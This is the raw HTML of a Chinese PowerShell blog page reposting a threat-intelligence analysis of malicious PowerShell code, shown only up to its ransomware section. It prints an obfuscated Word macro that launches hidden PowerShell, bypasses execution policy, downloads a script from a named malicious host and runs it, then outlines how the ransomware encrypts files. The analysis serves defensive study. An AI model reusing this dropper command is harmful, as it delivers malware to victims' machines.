@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7 no-js" lang="zh-CN">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8 no-js" lang="zh-CN">
+<![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!-->
+<html class="no-js" lang="zh-CN">
+<!--<![endif]-->
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+        		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <link rel="profile"  href="https://gmpg.org/xfn/11" />
+		<link rel="pingback" href="https://www.pstips.net/xmlrpc.php" />
+		<!-- html5shiv for IE8 and less  -->
+		<!--[if lt IE 9]>
+			<script src="https://www.pstips.net/wp-content/themes/customizr/assets/front/js/libs/html5.js"></script>
+		<![endif]-->
+		<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
+<title>Powershell恶意代码的N种姿势 &#8211; PowerShell 中文博客</title>
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="PowerShell 中文博客 &raquo; Feed" href="https://www.pstips.net/feed" />
+<link rel="alternate" type="application/rss+xml" title="PowerShell 中文博客 &raquo; 评论Feed" href="https://www.pstips.net/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="PowerShell 中文博客 &raquo; Powershell恶意代码的N种姿势评论Feed" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html/feed" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.pstips.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.3.4"}};
+			!function(e,a,t){var r,n,o,i,p=a.createElement("canvas"),s=p.getContext&&p.getContext("2d");function c(e,t){var a=String.fromCharCode;s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,e),0,0);var r=p.toDataURL();return s.clearRect(0,0,p.width,p.height),s.fillText(a.apply(this,t),0,0),r===p.toDataURL()}function l(e){if(!s||!s.fillText)return!1;switch(s.textBaseline="top",s.font="600 32px Arial",e){case"flag":return!c([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])&&(!c([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!c([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]));case"emoji":return!c([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}function d(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(i=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},o=0;o<i.length;o++)t.supports[i[o]]=l(i[o]),t.supports.everything=t.supports.everything&&t.supports[i[o]],"flag"!==i[o]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[i[o]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(r=t.source||{}).concatemoji?d(r.concatemoji):r.wpemoji&&r.twemoji&&(d(r.twemoji),d(r.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='yarppWidgetCss-css'  href='https://www.pstips.net/wp-content/plugins/yet-another-related-posts-plugin/style/widget.css?ver=5.3.4' type='text/css' media='all' />
+<link rel='stylesheet' id='tc-gfonts-css'  href='//fonts.googleapis.com/css?family=Squada+One:400%7CAllerta' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://www.pstips.net/wp-includes/css/dist/block-library/style.min.css?ver=5.3.4' type='text/css' media='all' />
+<link rel='stylesheet' id='cwp-style-css'  href='https://www.pstips.net/wp-content/plugins/comments-widget-plus/assets/css/cwp.css?ver=5.3.4' type='text/css' media='all' />
+<link rel='stylesheet' id='dwqa-style-css'  href='https://www.pstips.net/wp-content/plugins/dw-question-answer/templates/assets/css/style.css?ver=180720161357' type='text/css' media='all' />
+<link rel='stylesheet' id='dwqa-rtl-css'  href='https://www.pstips.net/wp-content/plugins/dw-question-answer/templates/assets/css/rtl.css?ver=180720161357' type='text/css' media='all' />
+<link rel='stylesheet' id='ez-icomoon-css'  href='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/vendor/icomoon/style.min.css?ver=2.0.11' type='text/css' media='all' />
+<link rel='stylesheet' id='ez-toc-css'  href='https://www.pstips.net/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.11' type='text/css' media='all' />
+<style id='ez-toc-inline-css' type='text/css'>
+div#ez-toc-container p.ez-toc-title {font-size: 120%;}div#ez-toc-container p.ez-toc-title {font-weight: 500;}div#ez-toc-container ul li {font-size: 100%;}div#ez-toc-container {background: #fafafa;border: 1px solid #ddd;}div#ez-toc-container p.ez-toc-title {color: #5a5a5a;}div#ez-toc-container ul.ez-toc-list a {color: #0088cc;}div#ez-toc-container ul.ez-toc-list a:hover {color: #0088cc;}div#ez-toc-container ul.ez-toc-list a:visited {color: #0088cc;}
+</style>
+<link rel='stylesheet' id='customizr-fa-css'  href='https://www.pstips.net/wp-content/themes/customizr/assets/shared/fonts/fa/css/fontawesome-all.min.css?ver=4.2.4' type='text/css' media='all' />
+<link rel='stylesheet' id='customizr-common-css'  href='https://www.pstips.net/wp-content/themes/customizr/inc/assets/css/tc_common.min.css?ver=4.2.4' type='text/css' media='all' />
+<link rel='stylesheet' id='customizr-skin-css'  href='https://www.pstips.net/wp-content/themes/customizr/inc/assets/css/blue.min.css?ver=4.2.4' type='text/css' media='all' />
+<style id='customizr-skin-inline-css' type='text/css'>
+
+                  .site-title,.site-description,h1,h2,h3,.tc-dropcap {
+                    font-family : 'Squada One';
+                    font-weight : 400;
+                  }
+
+                  body,.navbar .nav>li>a {
+                    font-family : 'Allerta';
+                    font-weight : inherit;
+                  }
+
+            body,.navbar .nav>li>a {
+              font-size : 16px;
+              line-height : 1.6em;
+            }
+table { border-collapse: separate; }
+                           body table { border-collapse: collapse; }
+                          
+.social-links .social-icon:before { content: none } 
+.sticky-enabled .tc-shrink-on .site-logo img {
+    					height:30px!important;width:auto!important
+    				}
+
+    				.sticky-enabled .tc-shrink-on .brand .site-title {
+    					font-size:0.6em;opacity:0.8;line-height:1.2em
+    				}
+
+          .comments-link .tc-comment-bubble {
+            color: #dd3333;
+            border: 2px solid #dd3333;
+          }
+          .comments-link .tc-comment-bubble:before {
+            border-color: #dd3333;
+          }
+        
+.tc-single-post-thumbnail-wrapper .tc-rectangular-thumb {
+          max-height: 250px;
+          height :250px
+        }
+
+        .tc-center-images .tc-single-post-thumbnail-wrapper .tc-rectangular-thumb img {
+          opacity : 0;
+          -webkit-transition: opacity .5s ease-in-out;
+          -moz-transition: opacity .5s ease-in-out;
+          -ms-transition: opacity .5s ease-in-out;
+          -o-transition: opacity .5s ease-in-out;
+          transition: opacity .5s ease-in-out;
+        }
+
+@media (max-width: 480px ){
+.tc-single-post-thumbnail-wrapper .tc-rectangular-thumb {
+            max-height: 200px;
+            height :200px
+          }
+}
+
+.tc-slider-loader-wrapper{ display:none }
+html.js .tc-slider-loader-wrapper { display: block }.no-csstransforms3d .tc-slider-loader-wrapper .tc-img-gif-loader {
+                                                background: url('https://www.pstips.net/wp-content/themes/customizr/assets/front/img/slider-loader.gif') no-repeat center center;
+                                         }.tc-slider-loader-wrapper .tc-css-loader > div { border-color:#08c; }
+</style>
+<link rel='stylesheet' id='customizr-style-css'  href='https://www.pstips.net/wp-content/themes/my-customizr/style.css?ver=4.2.4' type='text/css' media='all' />
+<link rel='stylesheet' id='fancyboxcss-css'  href='https://www.pstips.net/wp-content/themes/customizr/assets/front/js/libs/fancybox/jquery.fancybox-1.3.4.min.css?ver=5.3.4' type='text/css' media='all' />
+<link rel='stylesheet' id='open-social-style-css'  href='https://www.pstips.net/wp-content/plugins/open-social/res/main.css?ver=5.3.4' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/themes/customizr/assets/front/js/libs/fancybox/jquery.fancybox-1.3.4.min.js?ver=4.2.4'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var TCParams = {"_disabled":[],"FancyBoxState":"1","FancyBoxAutoscale":"1","SliderName":"","SliderDelay":"","SliderHover":"1","centerSliderImg":"1","SmoothScroll":{"Enabled":true,"Options":{"touchpadSupport":false}},"anchorSmoothScroll":"easeOutExpo","anchorSmoothScrollExclude":{"simple":["[class*=edd]",".tc-carousel-control",".carousel-control","[data-toggle=\"modal\"]","[data-toggle=\"dropdown\"]","[data-toggle=\"tooltip\"]","[data-toggle=\"popover\"]","[data-toggle=\"collapse\"]","[data-toggle=\"tab\"]","[data-toggle=\"pill\"]","[class*=upme]","[class*=um-]"],"deep":{"classes":[],"ids":[]}},"ReorderBlocks":"1","centerAllImg":"1","HasComments":"1","LeftSidebarClass":".span3.left.tc-sidebar","RightSidebarClass":".span3.right.tc-sidebar","LoadModernizr":"1","stickyCustomOffset":{"_initial":0,"_scrolling":0,"options":{"_static":true,"_element":""}},"stickyHeader":"","dropdowntoViewport":"","timerOnScrollAllBrowsers":"1","extLinksStyle":"1","extLinksTargetExt":"1","extLinksSkipSelectors":{"classes":["btn","button"],"ids":[]},"dropcapEnabled":"","dropcapWhere":{"post":"1","page":""},"dropcapMinWords":"30","dropcapSkipSelectors":{"tags":["IMG","IFRAME","H1","H2","H3","H4","H5","H6","BLOCKQUOTE","UL","OL"],"classes":["btn","tc-placeholder-wrap"],"id":[]},"imgSmartLoadEnabled":"1","imgSmartLoadOpts":{"parentSelectors":[".article-container",".__before_main_wrapper",".widget-front"],"opts":{"excludeImg":[".tc-holder-img"]}},"imgSmartLoadsForSliders":"","goldenRatio":"1.618","gridGoldenRatioLimit":"350","isSecondMenuEnabled":"","secondMenuRespSet":"in-sn-before","isParallaxOn":"1","parallaxRatio":"0.55","pluginCompats":[],"adminAjaxUrl":"https:\/\/www.pstips.net\/wp-admin\/admin-ajax.php","ajaxUrl":"https:\/\/www.pstips.net\/?czrajax=1","frontNonce":{"id":"CZRFrontNonce","handle":"9cdcc9c210"},"isDevMode":"","isModernStyle":"","i18n":{"Permanently dismiss":"\u6c38\u4e45\u5ffd\u7565\u6b64\u63d0\u793a"},"frontNotifications":{"styleSwitcher":{"enabled":false,"content":"","dismissAction":"dismiss_style_switcher_note_front","ajaxUrl":"https:\/\/www.pstips.net\/wp-admin\/admin-ajax.php"}}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/themes/customizr/inc/assets/js/tc-scripts.min.js?ver=4.2.4'></script>
+<script type='text/javascript' src='https://www.pstips.net/wp-content/plugins/open-social/res/jquery.qrcode.min.js?ver=5.3.4'></script>
+<link rel='https://api.w.org/' href='https://www.pstips.net/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.pstips.net/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.pstips.net/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='一些值得收藏的PowerShell工具' href='https://www.pstips.net/valuable-powershell-tools.html' />
+<link rel='next' title='PowerShell借助Office把Word文档转换成PDF' href='https://www.pstips.net/word-to-pdf-with-office.html' />
+<link rel="canonical" href="https://www.pstips.net/the-variety-of-powershell-malice-code.html" />
+<link rel='shortlink' href='https://www.pstips.net/?p=6239' />
+<link rel="alternate" type="application/json+oembed" href="https://www.pstips.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pstips.net%2Fthe-variety-of-powershell-malice-code.html" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.pstips.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.pstips.net%2Fthe-variety-of-powershell-malice-code.html&#038;format=xml" />
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?b690a30a7e1bc2fa3f1308c692207866";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-34859107-1', 'auto');
+  ga('send', 'pageview');
+</script>
+				<style type="text/css">.cwp-li {overflow: hidden;}.cwp-avatar {float: left;margin-top: .2em;margin-right: 1em;}.cwp-avatar.rounded .avatar{border-radius:50%;}.cwp-avatar.square .avatar{border-radius:0;}.cwp-comment-excerpt {display: block;color:#787878;}</style>
+			</head>
+	
+	<body class="post-template-default single single-post postid-6239 single-format-standard wp-embed-responsive tc-fade-hover-links tc-r-sidebar tc-center-images skin-blue tc-no-sticky-header sticky-disabled tc-regular-menu" >
+            <a class="screen-reader-text skip-link" href="#content">Skip to content</a>
+        
+    <div id="tc-page-wrap" class="">
+
+  		
+  	   	<header class="tc-header clearfix row-fluid tc-tagline-on tc-title-logo-on  tc-shrink-on tc-menu-on logo-left tc-second-menu-in-sn-before-when-mobile">
+  			
+        <div class="brand span3 pull-left">
+        <a class="site-logo" href="https://www.pstips.net/" aria-label="PowerShell 中文博客 | 收集和分享 Windows PowerShell 相关教程,技术和最新动态"><img src="https://www.pstips.net/wp-content/uploads/2013/11/PSTips-Logo.png" alt="首页"   style="max-width:250px;max-height:100px"  class=" "/></a>        </div> <!-- brand span3 -->
+
+        <div class="container outside"><h2 class="site-description">收集和分享 Windows PowerShell 相关教程,技术和最新动态</h2></div>      	<div class="navbar-wrapper clearfix span9 tc-submenu-fade tc-submenu-move tc-open-on-hover pull-menu-right">
+        	<div class="navbar resp">
+          		<div class="navbar-inner" role="navigation">
+            		<div class="row-fluid">
+              		<div class="social-block span5"><div class="social-links"><a rel="nofollow noopener noreferrer" class="social-icon icon-feed"  title="订阅我的 RSS" aria-label="订阅我的 RSS" href="http://www.pstips.net/feed/rss"  target="_blank" ><i class="fas fa-rss"></i></a><a rel="nofollow noopener noreferrer" class="social-icon icon-mail"  title="电子邮件" aria-label="电子邮件" href="mailto:mosser@live.cn"  target="_blank" ><i class="fas fa-envelope"></i></a><a rel="nofollow noopener noreferrer" class="social-icon icon-facebook"  title="在Facebook上关注我" aria-label="在Facebook上关注我" href="https://www.facebook.com/mosser.le"  target="_blank" ><i class="fab fa-facebook"></i></a><a rel="nofollow noopener noreferrer" class="social-icon icon-github"  title="在Github上关注我" aria-label="在Github上关注我" href="https://github.com/mosserlee/"  target="_blank" ><i class="fab fa-github"></i></a></div></div><h2 class="span7 inside site-description">收集和分享 Windows PowerShell 相关教程,技术和最新动态</h2><div class="nav-collapse collapse tc-hover-menu-wrapper"><div class="menu-first-menue-container"><ul id="menu-first-menue-2" class="nav tc-hover-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-has-children dropdown menu-item-2628"><a href="http://www.pstips.net/#">PowerShell资源 <strong class="caret"></strong></a>
+<ul class="dropdown-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-438"><a href="https://www.pstips.net/powershell-online-tutorials">PowerShell 在线教程</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3488"><a href="https://www.pstips.net/cat/powershell-%e8%a7%86%e9%a2%91%e6%95%99%e7%a8%8b">PowerShell 视频教程</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-444"><a href="https://www.pstips.net/cat/powershell/powershell-team-blog">PowerShell团队博客</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-450"><a href="https://www.pstips.net/cat/powershell/powershell-news">PowerShell 资讯</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2013"><a href="https://www.pstips.net/toolbox.html">开发工具</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children dropdown menu-item-2629"><a href="https://www.pstips.net/dwqa-questions">PowerShell交流中心 <strong class="caret"></strong></a>
+<ul class="dropdown-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2630"><a href="https://www.pstips.net/dwqa-ask-question">PowerShell在线提问</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7548"><a href="https://www.pstips.net/dwqa-questions">PowerShell交流中心</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children dropdown menu-item-437"><a href="https://www.pstips.net/cat/ebook">PowerShell 电子书 <strong class="caret"></strong></a>
+<ul class="dropdown-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-449"><a href="https://www.pstips.net/cat/ebook/cn">中文电子书</a></li>
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-439"><a href="https://www.pstips.net/cat/ebook/en">英文电子书</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-468"><a href="https://www.pstips.net/site-online-announce.html">关于本站 <strong class="caret"></strong></a>
+<ul class="dropdown-menu">
+	<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4901"><a href="https://www.pstips.net/cat/%e7%ab%99%e5%86%85%e5%85%ac%e5%91%8a">站内公告</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children dropdown menu-item-719"><a href="https://www.pstips.net/wp-admin/profile.php">用户中心 <strong class="caret"></strong></a>
+<ul class="dropdown-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3301"><a href="https://www.pstips.net/insert-code">在博客上贴PowerShell代码</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-5377"><a href="https://www.pstips.net/resolve-the-invalid-key-issue-when-reret-password.html">解决QQ邮箱重置密码链接无效的问题</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-720"><a href="https://www.pstips.net/wp-login.php">登陆</a></li>
+</ul></div></div><div class="btn-toggle-nav pull-right"><button type="button" class="btn menu-btn" data-toggle="collapse" data-target=".nav-collapse" title="展开菜单" aria-label="展开菜单"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span> </button><span class="menu-label">主菜单</span></div>          			</div><!-- /.row-fluid -->
+          		</div><!-- /.navbar-inner -->
+        	</div><!-- /.navbar resp -->
+      	</div><!-- /.navbar-wrapper -->
+    	  		</header>
+  		<div id="main-wrapper" class="container">
+
+    <div class="tc-hot-crumble container" role="navigation"><div class="row"><div class="span12"><div class="breadcrumb-trail breadcrumbs"><span class="trail-begin"><a href="https://www.pstips.net" title="PowerShell 中文博客" rel="home" class="trail-begin">首页</a></span> <span class="sep">&raquo;</span> <a href="https://www.pstips.net/cat/powershell" title="Powershell">Powershell</a> <span class="sep">&raquo;</span> <a href="https://www.pstips.net/cat/powershell/powershell-news" title="PowerShell资讯">PowerShell资讯</a> <span class="sep">&raquo;</span> <span class="trail-end">Powershell恶意代码的N种姿势</span></div></div></div></div>
+    <div class="container" role="main">
+        <div class="row column-content-wrapper">
+
+            
+                <div id="content" class="span9 article-container tc-gallery-style">
+
+                    
+                        
+                                                                                    
+                                                                    <article id="post-6239" class="row-fluid post-6239 post type-post status-publish format-standard category-powershell-news czr-hentry">
+                                                <header class="entry-header">
+          <h1 class="entry-title format-icon">Powershell恶意代码的N种姿势 <span class="comments-link"><a href="#tc-comment-title" title="7 评论开启 Powershell恶意代码的N种姿势" data-disqus-identifier="javascript:this.page.identifier"><span class="tc-comment-bubble default-bubble">7 </span></a></span></h1><div class="entry-meta"><a href="https://www.pstips.net/2017/02/14" title="下午 6:10" rel="bookmark"><time class="entry-date updated" datetime="2017-02-14T18:10:23+08:00">14 2月, 2017</time></a> &nbsp;在 <a class="" href="https://www.pstips.net/cat/powershell/powershell-news" title="参看所有文章 PowerShell资讯"> PowerShell资讯 </a> <span class="by-author"> 来自 <span class="author vcard author_name"><a class="url fn n" href="https://www.pstips.net/author/jailman" title="参看所有文章 jailman" rel="author">jailman</a></span></span> </div><hr class="featurette-divider __before_content">        </header>
+                  <section class="entry-content ">
+              <div id="ez-toc-container" class="ez-toc-v2_0_11 counter-hierarchy counter-numeric">
+<div class="ez-toc-title-container">
+<p class="ez-toc-title">本文目录</p>
+<span class="ez-toc-title-toggle"><a class="ez-toc-pull-right ez-toc-btn ez-toc-btn-xs ez-toc-btn-default ez-toc-toggle"><i class="ez-toc-glyphicon ez-toc-icon-toggle"></i></a></span></div>
+<nav><ul class="ez-toc-list ez-toc-list-level-1"><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%BD%AC%E8%87%AAfreebuf" title="转自freebuf">转自freebuf</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%BC%95%E8%A8%80" title="引言">引言</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90" title="实例分析">实例分析</a><ul class="ez-toc-list-level-3"><li class="ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6" title="勒索软件">勒索软件</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95" title="渗透测试">渗透测试</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%B5%81%E9%87%8F%E6%AC%BA%E9%AA%97" title="流量欺骗">流量欺骗</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%8E%A2%E6%B5%8B%E6%8E%A7%E5%88%B6" title="探测控制">探测控制</a></li><li class="ez-toc-page-1 ez-toc-heading-level-3"><a class="ez-toc-link ez-toc-heading-8" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86" title="信息搜集">信息搜集</a></li></ul></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-9" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li><li class="ez-toc-page-1 ez-toc-heading-level-2"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" title="参考资料">参考资料</a></li></ul></nav></div>
+<div class="ggad"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-0030498886267248"
+     data-ad-slot="3992944540"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script></div><h2><span class="ez-toc-section" id="%E8%BD%AC%E8%87%AAfreebuf"></span>转自freebuf<span class="ez-toc-section-end"></span></h2>
+<h2><span class="ez-toc-section" id="%E5%BC%95%E8%A8%80"></span>引言<span class="ez-toc-section-end"></span></h2>
+<p><b>人在做，天在看。</b></p>
+<p>技术从来都是中性的，被用来行善还是作恶完全取决于运用它的人。原子能可以用来发电为大众提供清洁能源，也可以用来制造能毁灭全人类的核武器，这不是一个完善的世界，于是我们既有核电站也有了核武器。</p>
+<p>Powershell，曾经Windows系统管理员的称手工具，在恶意代码制造和传播者手里也被玩得花样百出。由于Powershell的可执行框架部分是系统的组件不可能被查杀，而驱动它的脚本是非PE的而非常难以通过静态方法判定恶意性，同时脚本可以非常小巧而在系统底层的支持下功能却可以非常强大，这使利用Powershell的恶意代码绕过常规的病毒防护对系统为所欲为。因此，360天眼实验室近期看到此类恶意代码泛滥成灾就毫不奇怪，事实上，我们甚至看到所跟踪的APT团伙也开始转向Powershell。</p>
+<p>本文我们向大家展示一些看到的实际恶意代码的例子。</p>
+<h2><span class="ez-toc-section" id="%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"></span>实例分析<span class="ez-toc-section-end"></span></h2>
+<p>这里我们基于360威胁情报中心的数据，对接触到的Powershell恶意代码按分类各举一例。</p>
+<h3><span class="ez-toc-section" id="%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6"></span>勒索软件<span class="ez-toc-section-end"></span></h3>
+<p>我们知道现在勒索软件以其直接的变现方式现在已成为黑产的宠儿，像雨后春笋那样冒出来的勒索软件中，我们看到了使用纯Powershell脚本实现的例子。</p>
+<blockquote><p>样本MD5：ea7775da99367ac89f70f2a95c7f8e8e</p></blockquote>
+<p>这是一个通过Word文档中嵌入宏以诱导执行的勒索软件，使用工具提取出其中的宏，内容如下：</p>
+<pre><code class="hljs python"><span class="hljs-string">"vba_code"</span>: <span class="hljs-string">"Private Sub Document_Open() Dim FGHNBVRGHJJGFDSDUUUU As String FGHNBVRGHJJGFDSDUUUU = "</span>cmd /K <span class="hljs-string">" + "</span>pow<span class="hljs-string">" + "</span>e<span class="hljs-string">r" + "</span>Sh<span class="hljs-string">" + "</span>ell.e<span class="hljs-string">" + "</span>x<span class="hljs-string">" + "</span>e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">'</span><a href="http://rxlawyer.in/file.php"><span class="hljs-string">http://rxlawyer.in/file.php</span></a><span class="hljs-string">'</span>,<span class="hljs-string">'%TEMP%\Y.ps1'</span>); poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile -file %TEMP%\Y.ps1<span class="hljs-string">" Shell FGHNBVRGHJJGFDSDUUUU, 0 MsgBox ("</span>Module could <span class="hljs-keyword">not</span> be found.<span class="hljs-string">") FGHHH = 7 * 2 DGHhhdRGHH = 9 + 23 End Sub"</span></code></pre>
+<p>宏的功能是下载<a href="http://rxlawyer.in/file.php">http://rxlawyer.in/file.php</a>到本地的temp目录下，并用Powershell运行这个文件。而下载回来的file.php本质上是一个ps的脚本文件，MD5为：dd180477d6a0bb6ce3c29344546ebdfc 。</p>
+<p>勒索者脚本的实现原理是：通过随机生成加密密钥与用户ID，将加密密钥与用户ID信息上传到服务器进行备份，在用户机器上使用对称算法将用户的文档进行加密。因为密钥为随机生成，除非拥有攻击者服务器上备份的密钥，否则很难将被加密的文档进行还原。</p>
+<p>脚本的原貌为：</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603516445510.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603516445510.jpg!small"  alt="1.jpg" width="665" /></a></p>
+<p>可见，脚本做了混淆处理，简单处理以后归纳出的脚本主要执行过程如下：</p>
+<p><b>1. 生成三个随机数，分别表示加密密钥、加密用的盐、UUID</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603516856601.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603516856601.jpg!small"  alt="2.jpg" width="678" /></a></p>
+<p>把上面生成随机数发送到服务器中保存</p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603517149858.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603517149858.jpg!small"  alt="3.jpg" width="673" /></a></p>
+<p><b>2. 用随机数生成加密容器</b></p>
+<p><a class="highslide-image" href="http://image.3001.net/images/20160411/14603517669152.jpg" class="grouped_elements" rel="tc-fancybox-group6239" target="_blank"><img   src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://image.3001.net/images/20160411/14603517669152.jpg!small"  alt="4.jpg" width="666" /></a></p>
